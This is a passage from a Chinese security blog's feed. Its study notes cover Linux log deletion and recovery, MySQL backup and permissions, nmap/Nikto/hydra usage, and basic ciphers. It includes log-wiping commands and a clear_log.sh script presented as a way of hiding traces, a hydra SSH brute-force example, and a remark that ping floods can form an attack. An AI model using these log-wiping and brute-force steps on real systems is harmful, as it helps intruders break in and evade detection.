title="明文嗅探"></a>明文嗅探</h4><blockquote><p>要求运行Sniffer 程序的主机和被监听的主机必须在同一个以太网段上</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;网络踩点、路由信息探测&quot;&gt;&lt;a href=&quot;#网络踩点、路由信息探测&quot; class=&quot;headerlink&quot; title=&quot;网络踩点、路由信息探测&quot;&gt;&lt;/a&gt;网络踩点、路由信息探测&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;tracert命令(win下)&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;tracert命令诊断实用程序通过向目标计算机发送具有不同生存时间的ICMP数据包，来确定至目标计算机的路由，也就是说用来跟踪一个消息从一台计算机到另一台计算机所走的路径。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight powershell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;tracert [-d] [-h maximum_hops] [-j computer-list] [-w timeout] target_name&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="网络踩点" scheme="https://blog.0bug.xyz/tags/%E7%BD%91%E7%BB%9C%E8%B8%A9%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>Linux日志删除与恢复</title>
    <link href="https://blog.0bug.xyz/2018/01/17/Linux%E6%97%A5%E5%BF%97%E6%81%A2%E5%A4%8D/"/>
    <id>https://blog.0bug.xyz/2018/01/17/Linux日志恢复/</id>
    <published>2018-01-17T08:00:00.000Z</published>
    <updated>2018-10-15T20:25:08.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Linux-日志删除"><a href="#Linux-日志删除" class="headerlink" title="Linux 日志删除"></a>Linux 日志删除</h3><blockquote><p>Linux的系统日志一般位于/var/log目录内<br>以下为常见系统日志：</p></blockquote><p>–<br>   <a id="more"></a></p><blockquote><p>lastlog ：纪录最近几次成功登录的事件和最后一次不成功的登录<br>utmp ：纪录当前登录的每个用户<br>wtmp： 一个用户每次登录进入和退出时间的永久纪录<br>messages： 从syslog中记录信息（有的链接到syslog文件）<br>sudolog：纪录使用sudo发出的命令<br>sulog：纪录使用su命令的使用<br>syslog：从syslog中记录信息（通常链接到messages文件）<br>acct 或 pacct：记录每个用户使用的命令记录<br>history日志：这个文件保存了用户最近输入命令的记录</p></blockquote><p>–</p><blockquote><p>日志系统使用logrotate来进行自动清除以防止日志文件过大  在/etc/logrotate.conf logrotate.d 中<br>rotate 为转存次数</p></blockquote><h4 id="直接删除使用rm"><a href="#直接删除使用rm" class="headerlink" title="直接删除使用rm"></a>直接删除使用rm</h4><p>删除一定天数前的日志文件。输入命令：</p><blockquote><p>find  /var/log  -mtime  +3  -name  “*.log”  -exec  rm  -rf  {}  ;<br>该命令将/var/log/目录下所有3天前带“.log”的文件删除。</p></blockquote><p><strong>Tips:</strong><br>find 命令的使用:</p><p>-mtime -n +n</p><blockquote><p>按照文件的更改时间来查找文件，-n表示n天以内，+n表示n天以前</p></blockquote><p>“ *.log”</p><blockquote><p>匹配希望查找的数据类型</p></blockquote><p>-exec</p><blockquote><p>find命令对匹配的文件执行该参数所给出的shell命令。相应命令的形式为’command’ { } ;</p></blockquote><h4 id="脚本删除"><a href="#脚本删除" class="headerlink" title="脚本删除"></a>脚本删除</h4><p>cat /dev/null &gt; /var/log/lastlog</p><blockquote><p>cat /dev/null 可以看作一个”黑洞”.  所有写入它的内容都会永远丢失. 而尝试从它那儿读取内容则什么也读不到. </p></blockquote><p>因此可以使用此命令构建删除脚本: <strong>clear_log.sh</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">cat /dev/null &gt; /var/log/lastlog</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="清除history"><a href="#清除history" class="headerlink" title="清除history"></a>清除history</h4><p>history -c</p><blockquote><p>简单清除history 很容易被发现，因此需要按需删除记录在<strong>bash_history</strong>中的内容</p></blockquote><h4 id="应用日志同上"><a href="#应用日志同上" class="headerlink" title="应用日志同上"></a>应用日志同上</h4><h3 id="Linux-日志恢复"><a href="#Linux-日志恢复" class="headerlink" title="Linux 日志恢复"></a>Linux 日志恢复</h3><blockquote><p><strong>原理：</strong> 当进程打开了某个文件时，只要该进程保持打开该文件，即使将其删除，它依然存在于磁盘中。这意味着，进程并不知道文件已经被删除，它仍然可以向打开该文件时提供给它的文件描述符进行读取和写入。除了该进程之外，这个文件是不可见的，因为已经删除了其相应的目录索引节点。</p></blockquote><p>-</p><blockquote><p>要将日志恢复，首先要确保日志进程未停止运行，利用lsof命令找到该进程，利用进程标识符和文件描述符，使用cat命令将内容重写到日志文件，然后重启日志记录服务。</p></blockquote><h4 id="lsof的使用"><a href="#lsof的使用" class="headerlink" title="lsof的使用"></a><strong>lsof</strong>的使用</h4><blockquote><p>List Open Files 一个非常实用的系统级的监控、诊断工具<br>是有着最多开关的Linux/Unix命令之一</p></blockquote><p>lsof直接输入</p><blockquote><p>列出活跃进程的所有打开文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">COMMAND    PID  TID             USER   FD      TYPE             DEVICE  SIZE/OFF       NODE NAME</span><br><span class="line">systemd      1                  root  cwd       DIR               8,20      4096          2 /</span><br><span class="line">systemd      1                  root  rtd       DIR               8,20      4096          2 /</span><br><span class="line">systemd      1                  root  txt       REG               8,20   1690360     925307 /lib/systemd/systemd</span><br><span class="line">systemd      1                  root  mem       REG               8,20   1354616    1088074 /lib/x86_64-linux-gnu/libm-2.26.so</span><br><span class="line">systemd      1                  root  mem       REG               8,20    121016    1050521 /lib/x86_64-linux-gnu/libudev.so.1.6.8</span><br><span class="line">systemd      1                  root  mem       REG               8,20     84032    1050539 /lib/x86_64-linux-gnu/libgpg-error.so.0.22.0</span><br><span class="line">systemd      1                  root  mem       REG               8,20     18832    1050740 /lib/x86_64-linux-gnu/libattr.so.1.1.0</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>信息如下<br>COMMAND | 进程的名称<br>PID | 进程标识符<br>USER | 进程所有者<br>FD | 文件描述符，应用程序通过文件描述符识别该文件。如cwd、txt等<br>TYPE | 文件类型，如DIR、REG等<br>DEVICE | 指定磁盘的名称<br>SIZE | 文件的大小<br>NODE | 索引节点（文件在磁盘上的标识）<br>NAME | 打开文件的确切名称</p></blockquote><p>-i</p><blockquote><p>显示所有网络连接</p></blockquote><p>filename</p><blockquote><p>显示开启filename文件的进程</p></blockquote><p>-c processname</p><blockquote><p>显示该进程打开的文件</p></blockquote><p>-c -p pid</p><blockquote><p>显示该进程号对应的进程打开的文件</p></blockquote><p>-d dir</p><blockquote><p>显示该目录下被打开的文件</p></blockquote><p>-D dir</p><blockquote><p>同上 迭代显示目录下所有文件夹</p></blockquote><h4 id="wc命令的使用"><a href="#wc命令的使用" class="headerlink" title="wc命令的使用"></a><strong>wc</strong>命令的使用</h4><blockquote><p>wc的功能为统计指定文件中的字节数、字数、行数，并将统计结果显示输出</p></blockquote><p>-c</p><blockquote><p>统计字节数</p></blockquote><p>-l</p><blockquote><p>统计行数</p></blockquote><p>-m</p><blockquote><p>统计字符数，不能与 -c 标志一起使用</p></blockquote><p>-w </p><blockquote><p>统计字数，一个字被定义为由空白、跳格或换行字符分隔的字符串</p></blockquote><p>–version</p><blockquote><p>显示版本信息</p></blockquote><hr><p><strong>Tips：</strong><br>查看文件大小的几种方式</p><p>stat filepath</p><blockquote><p>时间、大小均显示，较详细</p></blockquote><p>wc -c filename</p><blockquote><p>只适用于文件，显示结果为字节数，无单位</p></blockquote><p>du -b/-h -filepath</p><blockquote><p>b 表示字节数 无单位<br>h 表示更友好的形式  有单位</p></blockquote><p>ls -lh filepath</p><blockquote><p>h代表human 对人更友好 </p></blockquote><hr><p>Linux 内核中提供了一种通过 /proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。</p><p>/proc/N/fd </p><blockquote><p>N为进程Pid ，该文件夹中包含进程相关的所有的文件描述符</p></blockquote><p>/proc/N/status</p><blockquote><p>进程的状态</p></blockquote><h4 id="查看日志情况"><a href="#查看日志情况" class="headerlink" title="查看日志情况"></a>查看日志情况</h4><blockquote><ul><li>使用lsof命令查看目前打开丢失日志的进程<br>  如 lsof | grep /var/log/syslog ，便可得到相应信息 COMMAND、PID、FD</li><li>使用wc命令查看日志情况<br>  如 wc -l /proc/1/fd/1 可查看在内存中的日志记录</li></ul></blockquote><h4 id="重写日志"><a href="#重写日志" class="headerlink" title="重写日志"></a>重写日志</h4><blockquote><p>cat /proc/1/fd/1 &gt; /var/log/syslog</p></blockquote><h4 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h4><p>对于许多应用程序，尤其是日志文件和数据库，这种恢复删除文件的方法非常有用。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Linux-日志删除&quot;&gt;&lt;a href=&quot;#Linux-日志删除&quot; class=&quot;headerlink&quot; title=&quot;Linux 日志删除&quot;&gt;&lt;/a&gt;Linux 日志删除&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;Linux的系统日志一般位于/var/log目录内&lt;br&gt;以下为常见系统日志：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;–&lt;br&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://blog.0bug.xyz/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>数据库安全</title>
    <link href="https://blog.0bug.xyz/2018/01/16/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"/>
    <id>https://blog.0bug.xyz/2018/01/16/数据库安全/</id>
    <published>2018-01-16T04:00:00.000Z</published>
    <updated>2018-10-15T20:25:23.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="数据库渗透技术"><a href="#数据库渗透技术" class="headerlink" title="数据库渗透技术"></a>数据库渗透技术</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>  此知识点繁杂详见另一篇文章</p><h3 id="数据库备份"><a href="#数据库备份" class="headerlink" title="数据库备份"></a>数据库备份</h3><h4 id="SQL-Server数据库备份"><a href="#SQL-Server数据库备份" class="headerlink" title="SQL Server数据库备份"></a>SQL Server数据库备份</h4><blockquote><p>在SQL Server2000中有数据库—完全，数据库—差异，事务日志，文件和文件组这个四种备份方式<br>  <a id="more"></a></p></blockquote><h4 id="MySQL数据库备份与恢复"><a href="#MySQL数据库备份与恢复" class="headerlink" title="MySQL数据库备份与恢复"></a>MySQL数据库备份与恢复</h4><p><strong>mysqldump的使用</strong></p><p> mysqldump -uroot -pPassword [database name] &gt; [dump file]</p><blockquote><p>备份文件中包含数据库结构和数据</p></blockquote><ul><li>-opt<blockquote><ul><li>dump文件中包含drop table if exists tableName</li><li>insert之前包含一个锁表语句lock tables tableName write，insert之后包含unlock tables</li></ul></blockquote></li></ul><p>mysqldump –host=host1 –opt sourceDb| mysql –host=host2 -C targetDb</p><blockquote><p>跨主机备份</p><ul><li>将host1上的sourceDb复制到host2的targetDb，前提是host2主机上已经创建targetDb数据库</li><li>-C为数据传输使用数据压缩</li></ul></blockquote><p>–no-data</p><blockquote><p>只备份数据库结构</p></blockquote><p>mysql [database name] &lt; [backup file name]</p><blockquote><p>还原数据从文件</p></blockquote><p>与cron命令结合实现自动备份<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute (0 - 59)</span><br><span class="line"># |  .------------- hour (0 - 23)</span><br><span class="line"># |  |  .---------- day of month (1 - 31)</span><br><span class="line"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name  command to be executed</span><br></pre></td></tr></table></figure></p><p>在/etc/crontab配置文件中加入下面代码行</p><p> 30 1 <em> </em> * root mysqldump -u root -pPassword –all-databases | gzip &gt; /mnt/disk2/database_<code>date &#39;+%m-%d-%Y&#39;</code>.sql.gz</p><blockquote><p> 每天凌晨1:30备份主机上的所有数据库并压缩dump文件为gz格式,date ‘+%m-%d-%Y’得到当前日期的MM-DD-YYYY格式</p></blockquote><p><strong>mysqlbinlog :二进制日志查看和使用工具</strong></p><blockquote><p>mysql的my.ini中 #log-bin =mysql-bin，去掉前面的#即可，需重启mysql；<br>二进制日志文件记录数据库的增加和删除操作，每重启一次mysql，将会增加一个binlog文件，格式为logbin.000001  当日志文件大于100m时会自动生成新的日志文件。<br><a href="http://www.cnblogs.com/martinzhang/p/3454358.html" target="_blank" rel="noopener">MySQL的binlog日志</a></p></blockquote><h3 id="双机热备技术"><a href="#双机热备技术" class="headerlink" title="双机热备技术"></a>双机热备技术</h3><h4 id="双机备份-MySQL主从模式"><a href="#双机备份-MySQL主从模式" class="headerlink" title="双机备份-MySQL主从模式"></a>双机备份-MySQL主从模式</h4><blockquote><p>所谓双机热备，即为解释为：当一台服务器出现故障时，可以由另一台服务器承担服务任务，从而在不需要人工干预的情况下，自动保证系统能持续提供服务。<br>与备份是 两回事情， 前者实现方法为故障转移，即当发生紧急情况时调用从机维护正常工作，后者为纯粹的数据拷贝，强调的是数据恢复。</p><p><a href="http://yunnick.iteye.com/blog/1845301" target="_blank" rel="noopener">参考</a></p></blockquote><h3 id="数据库安全配置"><a href="#数据库安全配置" class="headerlink" title="数据库安全配置"></a>数据库安全配置</h3><h4 id="MySQL数据库用户与权限管理"><a href="#MySQL数据库用户与权限管理" class="headerlink" title="MySQL数据库用户与权限管理"></a>MySQL数据库用户与权限管理</h4><blockquote><p>主要涉及到mysql数据库用户权限的分配与管理</p></blockquote><p>创建用户：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> mysql.user(Host,<span class="keyword">User</span>,<span class="keyword">Password</span>) <span class="keyword">values</span>(<span class="string">"localhost"</span>,<span class="string">"test"</span>,<span class="keyword">password</span>(<span class="string">"1234"</span>));</span><br></pre></td></tr></table></figure></p><p>修改用户密码<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> <span class="keyword">password</span>=<span class="keyword">password</span>(<span class="string">'123456'</span>) <span class="keyword">where</span> <span class="keyword">user</span>=<span class="string">'root'</span>;</span><br></pre></td></tr></table></figure></p><p><strong>修改完之后需要使用命令flush privileges保存才能生效。</strong></p><p>删除用户<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> <span class="keyword">test</span>@<span class="string">'localhost'</span>;</span><br></pre></td></tr></table></figure></p><blockquote><p>用户在新建时是usage的权限，usage权限在MySQL的官方理解为无权限，所以需要我们给用户授权，才能正常使用</p></blockquote><p>修改权限<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">select</span>,<span class="keyword">update</span> <span class="keyword">on</span> mysql.user <span class="keyword">to</span> tset@<span class="string">'localhost'</span>;</span><br><span class="line">fush privileges;</span><br><span class="line"></span><br><span class="line"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> <span class="keyword">test</span>@’localhost’; <span class="comment">/*.*为此用户授予数据库中所有表所有权限</span></span><br><span class="line"><span class="comment">fush privileges;</span></span><br></pre></td></tr></table></figure></p><p>查看用户权限<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">grants</span> <span class="keyword">for</span> <span class="keyword">test</span>@<span class="string">'localhost'</span>;</span><br></pre></td></tr></table></figure></p><p>撤销权限<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">revoke</span> <span class="keyword">delete</span>,<span class="keyword">update</span> <span class="keyword">on</span> mysql.user <span class="keyword">from</span> <span class="keyword">test</span>@<span class="string">'localhost'</span>;</span><br></pre></td></tr></table></figure></p><p><strong>附：忘记密码的处理办法</strong><br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shell&gt;service mysqld stop <span class="comment">#停止mysql服务</span></span><br><span class="line">shell&gt;mysqld_safe --skip-grant-tables &amp; <span class="comment">#以不启用grant-tables模式启动mysql</span></span><br><span class="line">shell&gt;mysql -uroot -p <span class="comment">#输入命令回车进入，出现输入密码提示直接回车。</span></span><br><span class="line">mysql&gt;use mysql;</span><br><span class="line">mysql&gt;update user set password=PASSWORD(<span class="string">"newpassord"</span>)where user=<span class="string">"root"</span>; <span class="comment">#更改密码为 newpassord</span></span><br><span class="line">mysql&gt;flush privileges; <span class="comment">#更新权限</span></span><br><span class="line">mysql&gt;quit <span class="comment">#退出</span></span><br></pre></td></tr></table></figure></p><h4 id="Sql-server-安全配置"><a href="#Sql-server-安全配置" class="headerlink" title="Sql server 安全配置"></a>Sql server 安全配置</h4><blockquote><p>默认情况下，SQL Server使用1433端口监听，修改1433端口有利于sql server的隐藏(该项修改需要重启数据库才能生效)。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;数据库渗透技术&quot;&gt;&lt;a href=&quot;#数据库渗透技术&quot; class=&quot;headerlink&quot; title=&quot;数据库渗透技术&quot;&gt;&lt;/a&gt;数据库渗透技术&lt;/h3&gt;&lt;h4 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=&quot;SQL注入&quot;&gt;&lt;/a&gt;SQL注入&lt;/h4&gt;&lt;p&gt;  此知识点繁杂详见另一篇文章&lt;/p&gt;
&lt;h3 id=&quot;数据库备份&quot;&gt;&lt;a href=&quot;#数据库备份&quot; class=&quot;headerlink&quot; title=&quot;数据库备份&quot;&gt;&lt;/a&gt;数据库备份&lt;/h3&gt;&lt;h4 id=&quot;SQL-Server数据库备份&quot;&gt;&lt;a href=&quot;#SQL-Server数据库备份&quot; class=&quot;headerlink&quot; title=&quot;SQL Server数据库备份&quot;&gt;&lt;/a&gt;SQL Server数据库备份&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;在SQL Server2000中有数据库—完全，数据库—差异，事务日志，文件和文件组这个四种备份方式&lt;br&gt;
    
    </summary>
    
    
      <category term="数据库" scheme="https://blog.0bug.xyz/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
      <category term="安全" scheme="https://blog.0bug.xyz/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Web安全相关</title>
    <link href="https://blog.0bug.xyz/2018/01/15/Web%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/"/>
    <id>https://blog.0bug.xyz/2018/01/15/Web安全相关/</id>
    <published>2018-01-15T04:00:00.000Z</published>
    <updated>2018-10-15T20:25:33.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web安全相关"><a href="#Web安全相关" class="headerlink" title="Web安全相关"></a>Web安全相关</h2><h4 id="主机发现-使用nmap"><a href="#主机发现-使用nmap" class="headerlink" title="主机发现(使用nmap)"></a>主机发现(使用nmap)</h4><blockquote><p>可以用于探测局域网内的活动主机<br>  <a id="more"></a><br>-sL<br>List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现。  </p></blockquote><p>-sn   </p><blockquote><p>Ping Scan 只进行主机发现，不进行端口扫描。</p></blockquote><h4 id="端口扫描-使用nmap"><a href="#端口扫描-使用nmap" class="headerlink" title="端口扫描(使用nmap)"></a>端口扫描(使用nmap)</h4><p>-sS </p><blockquote><p>TCP SYN扫描 被称为半开放扫描， 因为它不打开一个完全的TCP连接</p></blockquote><p>-sT </p><blockquote><p>TCP connect() 该扫描方式扫描速度比较慢，而且由于建立完整的TCP连接会在目标机上留下记录信息，不够隐蔽。在SYN无法使用时使用此选项</p></blockquote><p>-sU</p><blockquote><p>UDP端口扫描 </p></blockquote><p>-sA </p><blockquote><p>TCP ACK扫描 该方式只能用于确定防火墙是否屏蔽某个端口，可以辅助TCP SYN的方式来判断目标主机防火墙的状况。</p></blockquote><p>-sN; -sF; -sX </p><blockquote><p>TCP Null,FIN,Xmas扫描 这三种扫描方式被称为秘密扫描（Stealthy Scan），因为相对比较隐蔽。</p></blockquote><p>使用举例：</p><p>nmap –sS –sU –T4 –top-ports 300 192.168.1.100</p><blockquote><p>参数-sS表示使用TCP SYN方式扫描TCP端口；-sU表示扫描UDP端口；-T4表示时间级别配置4级；–top-ports 300表示扫描最有可能开放的300个端口（TCP和UDP分别有300个端口）。</p></blockquote><h4 id="版本侦测-使用nmap"><a href="#版本侦测-使用nmap" class="headerlink" title="版本侦测(使用nmap)"></a>版本侦测(使用nmap)</h4><p>-sV</p><blockquote><p>指定让Nmap进行版本侦测 </p></blockquote><h4 id="OS侦测-使用nmap"><a href="#OS侦测-使用nmap" class="headerlink" title="OS侦测(使用nmap)"></a>OS侦测(使用nmap)</h4><p>-O</p><blockquote><p>指定让Nmap进行OS侦测。</p></blockquote><p><strong>nmap 的其他用法</strong></p><blockquote><p><a href="http://blog.csdn.net/aspirationflow/article/details/7694274" target="_blank" rel="noopener">Nmap扫描原理与用法</a> <a href="http://www.freebuf.com/articles/network/32302.html" target="_blank" rel="noopener">Nmap简介(一)</a>  <a href="https://nmap.org/man/zh/index.html" target="_blank" rel="noopener">官方文档</a></p></blockquote><h4 id="Web漏洞扫描器-使用Nikto2"><a href="#Web漏洞扫描器-使用Nikto2" class="headerlink" title="Web漏洞扫描器(使用Nikto2)"></a>Web漏洞扫描器(使用Nikto2)</h4><blockquote><p>Nikto2开发语言为Perl，它可以扫描指定主机的web类型、主机名、特定目录、cookie、特定cgi 漏洞、xss漏洞、sql注入漏洞、返回主机允许的http 方法等安全问题</p></blockquote><p>-h</p><blockquote><p>指定主机 </p></blockquote><p>-p</p><blockquote><p>指定端口</p></blockquote><p>-o</p><blockquote><p>保存扫描结果 可生成html格式文档，易于查看</p></blockquote><h4 id="FTP弱口令扫描-使用hydra-亦可用来破解ssh"><a href="#FTP弱口令扫描-使用hydra-亦可用来破解ssh" class="headerlink" title="FTP弱口令扫描(使用hydra,亦可用来破解ssh)"></a>FTP弱口令扫描(使用hydra,亦可用来破解ssh)</h4><blockquote><p>该工具功能强大,支持几乎所有协议的在线密码破解,https,pop3,http-proxy,ftp,post、get方式提交，web登录均可破解。</p></blockquote><p>-L [FILE]</p><blockquote><p>指定用户名字典</p></blockquote><p>-P [FILE]</p><blockquote><p>指定密码字典</p></blockquote><p>-t [TASKS]</p><blockquote><p>同时运行的线程数，默认为16</p></blockquote><p>-v / -V</p><blockquote><p>显示详细过程</p></blockquote><p>使用举例：</p><p>hydra -L users.txt -P password.txt -t 1 -vV  192.168.1.104 ssh</p><h4 id="连通性探测"><a href="#连通性探测" class="headerlink" title="连通性探测"></a>连通性探测</h4><p><strong>使用PING判断TCP/IP故障</strong></p><p>Ping 127.0.0.1：</p><blockquote><p>127.0.0.1是本地循环地址，如果本地址无法Ping通，则表明本地机TCP/IP协议不能正常工作。</p></blockquote><p>Ping本机的IP地址：</p><blockquote><p>用IPConfig查看本机IP，然后Ping该IP，通则表明网络适配器（网卡或MODEM）工作正常，不通则是网络适配器出现故障。</p></blockquote><p>Ping同网段计算机的IP：</p><blockquote><p>Ping一台同网段计算机的IP，不通则表明网络线路出现故障；若网络中还包含有路由器，则应先Ping路由器在本网段端口的IP，不通则此段线路有问题；通则再PING路由器在目标计算机所在网段的端口IP，不通则是路由出现故障；通则再Ping目的机IP地址。</p></blockquote><p>Ping网址：</p><blockquote><p>若要检测一个带DNS服务的网络，在上一步Ping通了目标计算机的IP地址后，仍无法连接到该机，则可PING该机的网络名，比如Ping <a href="http://www.sina.com.cn，正常情况下会出现该网址所指向的IP，这表明本机的DNS设置正确而且DNS服务器工作正常，反之就可能是其中之一出现了故障；" target="_blank" rel="noopener">www.sina.com.cn，正常情况下会出现该网址所指向的IP，这表明本机的DNS设置正确而且DNS服务器工作正常，反之就可能是其中之一出现了故障；</a></p></blockquote><p>-t</p><blockquote><p>win下不停地ping</p></blockquote><p>-n</p><blockquote><p>发送指定的Echo数据包数。在默认情况下，一般都只发送四个数据包，通过这个命令可以自己定义发送的个数，对衡量网络速度很有帮助。</p></blockquote><p>-l</p><blockquote><p>定义echo数据包大小,在默认的情况下windows的ping发送的数据包大小为32byt，我们也可以自己定义它的大小，但最大只能发送65500byte。<br>配合-t使用并且多台计算机可以形成很大攻击~</p></blockquote><p>-r</p><blockquote><p>通过此参数就可以记录经过的路由的个数，最大为9个，也就是说只能跟踪到9个路由器</p></blockquote><p><strong>使用ipconfig查看网络配置</strong></p><p>/?：</p><blockquote><p>显示ipconfig的格式和参数的说明 ；</p></blockquote><p>/all</p><blockquote><p>显示本机TCP/IP配置的详细信息；</p></blockquote><p>/flushdns</p><blockquote><p>清除本地DNS缓存内容；</p></blockquote><p>/displaydns</p><blockquote><p>显示本地DNS内容；</p></blockquote><p><strong>使用netstat查看主机与因特网的连接</strong></p><blockquote><p>参考 <a href="https://linux.cn/article-2434-1.html" target="_blank" rel="noopener">netstat 的10个基本用法</a></p></blockquote><p>-a</p><blockquote><p>列出 tcp, udp 和 unix 协议下所有套接字的所有连接。</p></blockquote><p>-t/-u</p><blockquote><p>只列出 TCP 或 UDP 协议的连接</p></blockquote><p>-n</p><blockquote><p>禁用反向解析，加快速度</p></blockquote><p>-l</p><blockquote><p>只列出监听中的连接</p></blockquote><p>-p</p><blockquote><p>获取进程名、进程号以及用户 ID,-ep 选项可以同时查看进程名和用户名。</p></blockquote><p>-i</p><blockquote><p>打印网络接口信息 -ei 可以输出用户友好的信息。</p></blockquote><p>grep</p><blockquote><p>可以查看服务是否在运行</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Web安全相关&quot;&gt;&lt;a href=&quot;#Web安全相关&quot; class=&quot;headerlink&quot; title=&quot;Web安全相关&quot;&gt;&lt;/a&gt;Web安全相关&lt;/h2&gt;&lt;h4 id=&quot;主机发现-使用nmap&quot;&gt;&lt;a href=&quot;#主机发现-使用nmap&quot; class=&quot;headerlink&quot; title=&quot;主机发现(使用nmap)&quot;&gt;&lt;/a&gt;主机发现(使用nmap)&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;可以用于探测局域网内的活动主机&lt;br&gt;
    
    </summary>
    
    
      <category term="Web安全" scheme="https://blog.0bug.xyz/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>一些密码算法</title>
    <link href="https://blog.0bug.xyz/2018/01/15/%E4%B8%80%E4%BA%9B%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95/"/>
    <id>https://blog.0bug.xyz/2018/01/15/一些密码算法/</id>
    <published>2018-01-15T04:00:00.000Z</published>
    <updated>2018-10-15T20:25:42.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一些密码算法"><a href="#一些密码算法" class="headerlink" title="一些密码算法"></a>一些密码算法</h2><h3 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h3><h4 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h4><blockquote><p>简单的字母移位<br>安全性太差、易破解，位移数字取值{0-25}<br>  <a id="more"></a></p></blockquote><h4 id="单表代换密码"><a href="#单表代换密码" class="headerlink" title="单表代换密码"></a>单表代换密码</h4><blockquote><p>对字母表中的每一个字母用别的字母代替形成密文</p></blockquote><h3 id="对称密码算法"><a href="#对称密码算法" class="headerlink" title="对称密码算法"></a>对称密码算法</h3><h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><blockquote><ul><li>第一个被公布出来的标准算法,目前逐步被AES算法替代</li><li>采用对称分组密码体制</li><li>该算法加密解密用同一算法。对密钥进行保密，而公开算法，包括加密和解密算法。因此，破译DES加密算法实际上就是搜索密钥的编码。</li></ul></blockquote><p><strong>DES算法原理</strong><br>DES块长度为64位，密钥表面上为64位，其实只有56位用于算法 